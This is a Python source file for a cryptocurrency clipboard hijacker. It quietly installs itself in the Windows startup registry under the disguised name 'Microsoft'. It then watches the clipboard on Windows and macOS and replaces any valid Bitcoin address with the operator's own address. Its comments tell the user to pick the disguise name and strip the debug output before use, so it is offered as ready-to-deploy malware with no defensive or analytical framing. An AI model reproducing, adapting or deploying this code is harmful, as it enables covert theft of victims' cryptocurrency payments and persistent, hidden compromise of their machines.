from sys import platform
from hashlib import sha256
from time import sleep
import subprocess
import ctypes
import os
import winreg;
file_path = os.path.realpath(__file__) #<Retrieves file path of where script is running from. 
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0,
winreg.KEY_SET_VALUE); winreg.SetValueEx(key, 'Microsoft', 0,  #<Adds to startup through registry. You can change 'Microsoft' to whatever registry name you want displayed.
winreg.REG_SZ, file_path);

Windows = False
Mac = False
Linux = False
FirstRun = True

CF_TEXT = 1
kernel32 = ctypes.windll.kernel32
kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
kernel32.GlobalLock.restype = ctypes.c_void_p
kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
user32 = ctypes.windll.user32
user32.GetClipboardData.restype = ctypes.c_void_p
digits58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'

ReplacementAddress = "YOUR ADDRESS HERE" #<Add your Bitcoin address here. 

def decode_base58(bc, length):
    n = 0
    for char in bc:
        n = n * 58 + digits58.index(char)
    return n.to_bytes(length, 'big')
def check_bc(bc):
    try:
        bcbytes = decode_base58(bc, 25)
        return bcbytes[-4:] == sha256(sha256(bcbytes[:-4]).digest()).digest()[:4]
    except Exception:
        return False

def get_clipboard_text():
    if Windows:
        user32.OpenClipboard(0)
        try:
            if user32.IsClipboardFormatAvailable(CF_TEXT):
                data = user32.GetClipboardData(CF_TEXT)
                data_locked = kernel32.GlobalLock(data)
                text = ctypes.c_char_p(data_locked)
                value = text.value
                kernel32.GlobalUnlock(data_locked)
                return str(value).split('\'')
        finally:
            user32.CloseClipboard()
    elif Mac:
        p = subprocess.Popen(['pbpaste'], stdout=subprocess.PIPE)
        retcode = p.wait()
        clipcontents = p.stdout.read()
        return clipcontents
    
#<Detecting Bitcoin address in clipboard, then replacing with set address in line 28.
def ToClipboard(txt):
    global Windows,Mac
    if Windows:
        cmd='echo '+txt.strip()+'|clip'
        return subprocess.check_call(cmd, shell=True)
    elif Mac:
        cmd='echo '+txt.strip()+'|pbcopy'
        return subprocess.check_call(cmd, shell=True)
 
def CheckOS():
    global Windows , Mac , FirstRun , Linux
    if FirstRun:
        if platform == "linux" or platform == "linux2":
            Linux = True
        elif platform == "darwin":
            Mac = True
        elif platform == "win32":
            Windows = True
    FirstRun = False

if __name__ == "__main__":
    CheckOS()
    print('Is Mac?:' + str(Mac) + ' Is Windows?:' + str(Windows) + ' Is Linux?:' +str(Linux)) #<Just For Debugging. Remove/Comment out for use.
    if Windows:
        while 1:
            try:
                sleep(1) #<This can be modified or removed, however, 0 Delay can lag the clipboard.
                if check_bc(get_clipboard_text()[1]):
                    previous = get_clipboard_text()[1] #<Just For Debugging. Remove/Comment out for use.
                    print('string found, replacing with value...') #<Just For Debugging. Remove/Comment out for use.
                    ToClipboard(ReplacementAddress)
                    print('Replaced Value Successfully. | Changed ' + previous + ' To ' + ReplacementAddress) #<Just For Debugging. Remove/Comment out for use.
            except:
                continue
    elif Mac:
       while 1:
           try:
               sleep(1)
               if check_bc(get_clipboard_text()):
                   previous = get_clipboard_text() #<Just For Debugging. Remove/Comment out for use.
                   print('string found, replacing with value...') #<Just For Debugging. Remove/Comment out for use.
                   ToClipboard(ReplacementAddress)
                   print('Replaced Value Successfully. | Changed ' + previous + ' To ' + ReplacementAddress) #<Just For Debugging. Remove/Comment out for use.
           except:
               continue
    elif Linux:
        print('Not Supported Yet.')
